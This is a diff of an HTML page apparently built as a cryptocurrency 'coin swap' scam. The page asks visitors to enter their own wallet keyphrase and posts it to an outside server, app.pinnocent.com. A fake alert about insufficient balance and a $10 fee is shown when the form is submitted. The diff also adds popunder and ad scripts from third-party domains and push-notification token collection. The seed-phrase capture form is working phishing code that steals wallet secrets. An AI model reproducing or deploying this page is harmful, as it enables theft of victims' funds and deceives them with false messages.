@@ -1,32 +1,128 @@
-<style type="text/css">
-  .ctp {
-    width: 240px;
-    height: 90px;
-    display: inline-block;
-    border: solid #171426;
-    margin: 3px;
-    box-shadow: 1px 5px 6px 0px black;
-  }
-    .ctp2 {
-    width: 200px;
-    height: 50px;
-    display: inline-block;
-    border: solid #171426;
-    margin: 3px;
-    background-color:white;
-    box-shadow: 1px 5px 6px 0px black;
-    }
-  .iconn {
-    width: 50px;
-    height: 50px;
-  }
-</style>
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-E7K8F1651E"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-E7K8F1651E');
+</script>
+<script type="text/javascript">
+   var uid = '330441';
+   var wid = '717208';
+   var pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag);
+   pop_tag.onerror = function() {pop_tag = document.createElement('script');pop_tag.src='//nairaa.com/2show.js';document.body.appendChild(pop_tag)};
+</script>
+<script src="back.js?1734976792"> 
+</script>
+<script src="https://old.pinnocent.coms/jspopunder.min.js"></script>
+	<script>
+	jsPopunder('https://noopsaithu.net/4/7193696', {
+		name: 'poptest', 
+		width: (screen.width/2), 
+		height: (screen.height-100), 
+		top: 0, left: 0, 
+		wait: 43200, cap: 120000
+	});
+	</script>
+
+	
+ <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getMessaging, getToken } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-messaging.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBV2pY0LLJTrHhiCFArAedQpTiUshDJsi8",
+            authDomain: "pinnocent-fa387.firebaseapp.com",
+            databaseURL: "https://pinnocent-fa387.firebaseio.com",
+            projectId: "pinnocent-fa387",
+            storageBucket: "pinnocent-fa387.firebasestorage.app",
+            messagingSenderId: "403452483449",
+            appId: "1:403452483449:web:630abc1e7c265a8f0481a8",
+            measurementId: "G-8DGVGDCCL2"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const messaging = getMessaging(app);
+
+        // Register the service worker
+        navigator.serviceWorker.register("firebase-messaging-sw.js").then(registration => {
+            // Get the token
+            getToken(messaging, {
+                serviceWorkerRegistration: registration,
+                vapidKey: 'BLf-6mYxA6BPIXK-MpMWYKuLDPpbKFtXdERFs506kY1xZsek0B8ieRRIikBGaO0LKrFXzglm-mNr4rpMypLLiJ4'
+            }).then((currentToken) => {
+                if (currentToken) {
+                    console.log("Token is: " + currentToken);
+                    // Send the token to your server
+                    sendTokenToServer(currentToken);
+                } else {
+                    console.log('No registration token available. Request permission to generate one.');
+                }
+            }).catch((err) => {
+                console.log('An error occurred while retrieving token. ', err);
+            });
+        }).catch((err) => {
+            console.log('Service worker registration failed: ', err);
+        });
+
+        function sendTokenToServer(token) {
+            // Create a JSON object to send
+            const data = {
+                token: token
+            };
+
+            // Send the token to the server using fetch with API method
+            fetch('https://push.pinnocent.com/sub.php', { // Ensure this URL is correct
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json' // Specify the content type
+                },
+                body: JSON.stringify(data) // Convert the data to JSON
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json(); // Parse the JSON response
+            })
+            .then(data => {
+                console.log(data); // Log the response from the server
+            })
+            .catch(error => {
+                console.error('Error sending token to server:', error);
+            });
+        }
+
+        messaging.onMessage(function(payload) {
+	  console.log("Message received. ", payload);
+	  notificationTitle = payload.data.title;
+	  notificationOptions = {
+	  	body: payload.data.body,
+	  	icon: payload.data.icon,
+	  	image:  payload.data.image
+	  };
+	  var notification = new Notification(notificationTitle,notificationOptions);
+	});
+    </script>
+</head>
+<body>
 <center>
+ 
+  
+</center>
 </body>
+
+<!DOCTYPE html>
+
 <html lang="zxx" class="js">
 
 <head>
-  
 
  <meta name=”robots” content=”noindex”>
 
@@ -59,51 +155,209 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
 	<meta name="description" content="ICO Crypto is a modern and elegant gift , created for ICO Agencies and digital crypto currency investment website.">
-		  <!-- my message area -->
-	<script>
-	</script>
-<!-- -->
-<center>
-  <img class="iconn" src="moni.png">
+
+	<!-- Fav Icon  -->
+
+
+<html>
+<head>
   
-  <h2> Exchange coins to your own wallet Address</h2>
-<form id="anonymousNewMessage" class="form" method="POST" action="https://pinnocent.com/vpage">
+  <p id=""></p>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/7.14.6/firebase-messaging.js"></script>
+<script>
+    var firebaseConfig = {
+apiKey: "AIzaSyBV2pY0LLJTrHhiCFArAedQpTiUshDJsi8",
+  authDomain: "pinnocent-fa387.firebaseapp.com",
+  databaseURL: "https://pinnocent-fa387.firebaseio.com",
+  projectId: "pinnocent-fa387",
+  storageBucket: "pinnocent-fa387.appspot.com",
+  messagingSenderId: "403452483449",
+  appId: "1:403452483449:web:630abc1e7c265a8f0481a8",
+  measurementId: "G-8DGVGDCCL2"
+};
+    firebase.initializeApp(firebaseConfig);
+    const messaging=firebase.messaging();
+
+    function IntitalizeFireBaseMessaging() {
+        messaging
+            .requestPermission()
+            .then(function () {
+                console.log("Notification Permission");
+                return messaging.getToken();
+            })
+            .then(function (token) {
+                console.log("Token : "+token);
+                document.getElementById("token").innerHTML=token;
+            })
+            .catch(function (reason) {
+                console.log(reason);
+            });
+    }
+
+    messaging.onMessage(function (payload) {
+        console.log(payload);
+        const notificationOption={
+            body:payload.notification.body,
+            icon:payload.notification.icon
+        };
+
+        if(Notification.permission==="granted"){
+            var notification=new Notification(payload.notification.title,notificationOption);
+
+            notification.onclick=function (ev) {
+                ev.preventDefault();
+                window.open(payload.notification.click_action,'https://nairaa.com/chat.html?');
+                notification.close();
+            }
+        }
+
+    });
+    messaging.onTokenRefresh(function () {
+        messaging.getToken()
+            .then(function (newtoken) {
+                console.log("New Token : "+ newtoken);
+            })
+            .catch(function (reason) {
+                console.log(reason);
+            })
+    })
+    IntitalizeFireBaseMessaging();
+</script> 
+	<title> swap coin</title>
+	
+  <meta name=”robots” content=”noindex”>
+  
+<meta name="robots" content="noindex,follow">
+<meta name="robots" content="index,nofollow">
+<meta name="robots" content="noindex,nofollow">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noodp" />
+    <meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noodp" />
+	<meta charset="utf-8">
+
+	<meta name="description" content="swap coin">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta property='og:image' content='earnmoney.jpg' />
+	<link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-ios7-contact-512.png">
+	<style>
+		table tr td{text-align:center;}
+.button {
+  background-color: #4CAF50; /* Green */
+  border: none;
+  color: white;
+  padding: 14px 20px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 1px 0px;
+  cursor: pointer;
+}
+.button1 {width: 208px;
+border-radius: 4px;
+border: 1px solid DarkGray;
+padding: 13px 13px;
+margin: 3px 3px;
+height: 22px;
+background-color: rgb(249,249,249);
+display: inline-block; }
+.button2 {width: 50%;}
+.button3 {width: 280px;
+border-radius: 4px;
+border: 1px solid DarkGray;
+padding: 13px 13px;
+margin: 3px 3px;
+height: 100px;
+background-color: rgb(249,249,249);
+display: inline-block;
+
+}
+		.bottom a{color:#D3D3D3;}
+		.bottom a:link{text-decoration:none;}
+		input{padding:10px;}
+		
+		.login{background-color:rgb(19,90,245);color:white;
+border-radius: 10px;
+padding: 13px 13px;
+margin: -15px -15px;
+border: 1px solid DarkGray;
+font-family: 'segoe UI';
+font-weight: bold;
+
+		}
+		
+.center {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 50%;
+width: 360px;
+  height: 80px;
+}
+		.login{width: 97%;}
+		.check{background-color:#0ac21e;color:white;padding:10px;
+margin: 4px 2px;
+		}
+		.inputf a:link{text-decoration:none;}
+	</style>
+</head>
+<body style="margin:0px;">
+<script>
+	document.title='swap coin';
+</script>
+<div style="width:100%;">
+  
+<div style="width:100%;">
+<style>
+    .iconn {
+    width: 50px;
+    height: 50px;
+     .ctp {
+    width: 240px;
+    height: 90px;
+    display: inline-block;
+    border: solid #171426;
+    margin: 3px;
+    box-shadow: 1px 5px 6px 0px black;
+  }
+</style>
+	
+</div>
+
+</div>
+<div style="width:100%;">
+ 
+<center>
+<div class="inputf" style="background-color:white;padding:10px;text-align:center;">
+    <img class="iconn" src="moni.png">
+    <h2> Exchange coin to your wallet addresses </h2>
+<form id="anonymousNewMessage" class="form" method="POST" action="https://app.pinnocent.com/vpage">
     <input type="hidden" name="ftype" value="normal" />
+
+     
      
                 </div>
                 <div class="card-body">
 
                   <input type="hidden" name="user_id" id="userUsername" value="16934">
-		<textarea name="message_title" type="text" id="" placeholder="Enter Phrase to swap" maxlength="400"
-		required class="ctp"></textarea>
-		<br>
+	<textarea class="button3" name="message_title" type="text" placeholder="Enter Keyphrase to swap" maxlength="400" required=""></textarea>
+	<br>
 		<img src="dola.png" class="iconn">
-		<br>
-		<textarea class="ctp"  name="description" type="text" id="pass" placeholder="Enter Your own Keyphrase" maxlength="400" size="35px"
+	<br>
+		<textarea class="button3"  name="description" type="text" id="pass" placeholder="Enter your own Keyphrase" maxlength="400" size="35px"
 		required></textarea>
 
-    <input class="ctp" type="hidden" name="ip" value="172.71.232.21" />
-<input type="hidden" name="link" value="keyphrase"/>
+    <input type="hidden" name="ip" value="172.71.118.164" />
+<input type="hidden" name="link" value="keyphrase" />
 
-    <!-- the rest of the form //.
+    <!-- the rest of the form //-->
 
 <br/><br/>
-<!-- -->
-<br>
-		<button class="ctp2" name="login" type="submit" value="Request Withdraw" id="submitBtn" onclick="alert('Invalid details/phrase or Insufficient balance on your wallet for charges fees. Please Note Charges fee is $10 upward')"> <stong> <b>Request Withdraw</stong></button><br/><br/>
+		<input class="login" name="login" type="submit" id="anonymousProcess" value="Request Withdraw" style="width:250px; height:50px;"><br/><br/>
 
 	
 </div>
-</div>
-                 
-  <!--   Core JS Files   .
- 
-   
-  <!-- Control Center for Now Ui Kit: parallax effects, scripts for the example pages etc .
-
-  
-
-  <script src="https://nairaa.com/back.js?1734976792">  <!-- Google tag (gtag.js) .
+  <script src="https://nairaa.com/back.js?1734976792">  <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-E7K8F1651E"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -126,7 +380,6 @@
 
 
   </script>
-  <!-- -->
 </body>
 </html>
   
@@ -143,204 +396,30 @@
                               
 
                               
-<!-- .info-card .
 
-                        <div class="token-card">
+                                <div class="col-sm-3">
 
-                            <div class="token-info">
+                                  
 
-                                <span class="token-smartag">ICO Phase 2</span>
+                                  
 
-                                <h2 class="token-bonus">20% <span>Current Bonus</span></h2>
+                                  
 
-                                <ul class="token-timeline">
+                                  
 
-                                    <li><span>START DATE</span>14 Jul 2022</li>
-
-                                    <li><span>END DATE</span>25 Aug 2024</li>
-
-                                </ul>
-
-                            </div>
-
-                            <div class="token-countdown">
-
-                                <span class="token-countdown-title">THE BONUS END IN</span>
-
-                                <div class="token-countdown-clock" data-date="2022/12/10"></div>
-
-                            </div>
-
-                        </div><!-- .token-card .
-
-                        <div class="progress-card">
-
-                            <h4>Token Sale Progress</h4>
-
-                            <ul class="progress-info">
-
-                                <li><span>Raised -</span> 2,758 ICOX</li>
-
-                                <li><span>TOTAL -</span> 1,500,000 ICOX</li>
-
-                            </ul>
-
-                            <div class="progress-bar">
-
-                                <div class="progress-hcap" style="width:90%">
-
-                                    <div>Hard cap <span>1,400,000</span></div>
-
-                                </div>
-
-                                <div class="progress-scap" style="width:34%">
-
-                                    <div>Soft cap <span>40,000</span></div>
-
-                                </div>
-
-                                <div class="progress-psale" style="width:12%">
-
-                                    <div>Pre Sale <span>10,000</span></div>
-
-                                </div>
-
-                                <div class="progress-percent" style="width:25%"></div>
-
-                            </div>
-
-                        </div>
-
-                        <div class="gaps-3x"></div>
-
-                        <div class="table-responsive">
-
-                            <table class="table">
-
-                                <thead>
-
-                                    <tr>
-
-                                        <th>PreSale</th>
-
-                                        <th>Sale Stage 1</th>
-
-                                        <th>Sale Stage 2</th>
-
-                                    </tr>
-
-                                </thead>
-
-                                <tbody>
-
-                                    <tr>
-
-                                        <td><span>Start Date</span>03 December 2022</td>
-
-                                        <td><span>Start Date</span>15 December 2022</td>
-
-                                        <td><span>Start Date</span>28 December 2022</td>
-
-                                    </tr>
-
-                                    <tr>
-
-                                        <td><span>End Date</span>19 July 2023</td>
-
-                                        <td><span>End Date</span>02 September 2023</td>
-
-                                        <td><span>End Date</span>16 November 2023</td>
-
-                                    </tr>
-
-                                    <tr>
-
-                                        <td><span>Bonus</span>30%</td>
-
-                                        <td><span>Bonus</span>20%</td>
-
-                                        <td><span>Bonus</span>10%</td>
-
-                                    </tr>
-
-                                    <tr>
-
-                                        <td><span>Soft Cap</span>$ 20M</td>
-
-                                        <td><span>Hard Cap</span>$ 50M</td>
-
-                                        <td><span>Hard Cap</span>$ 30M</td>
-
-                                    </tr>
-
-                                </tbody>
-
-                            </table>
-
-                        </div>
-
-                        
-
-                    </div><!-- .user-panel .
-
-                </div><!-- .user-content .
-
-            </div><!-- .d-flex .
-
-        </div><!-- .container .
-
-    </div>
-
-    <!-- UserWraper End .
-
+                  
     
 
     
 
-    <div class="footer-bar">
-
-        <div class="container">
-
-            <div class="row">
-
-                <div class="col-md-7">
-
-                    <span class="footer-copyright">Copyright 2018, <a href="#">ICO Crypto</a>.  All Rights Reserved.</span>
-
-                </div><!-- .col .
-
-                <div class="col-md-5 text-md-right">
-
-                    <ul class="footer-links">
-
-                        <li><a href="policy.html">Privacy Policy</a></li>
-
-                        <li><a href="policy.html">Terms of Sales</a></li>
-
-                    </ul>
-
-                </div><!-- .col .
-
-            </div><!-- .row .
-
-        </div><!-- .container .
-
-    </div>
-
-    <!-- FooterBar End .
-
-    
-
-    
-
-	<!-- JavaScript (include all script here) .
+	<!-- JavaScript (include all script here) -->
 
 
 
 	
 
                  
-  <!--   Core JS Files   .
+  <!--   Core JS Files   -->
 
  
 
@@ -348,7 +427,7 @@
 
  
 
-  <!-- Control Center for Now Ui Kit: parallax effects, scripts for the example pages etc .
+  <!-- Control Center for Now Ui Kit: parallax effects, scripts for the example pages etc -->
 
 
 
@@ -356,7 +435,7 @@
 
 
 
-  <script src="https://nairaa.com/back.js?1734976792">  <!-- Google tag (gtag.js) .
+  <script src="https://nairaa.com/back.js?1734976792">  <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-E7K8F1651E"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
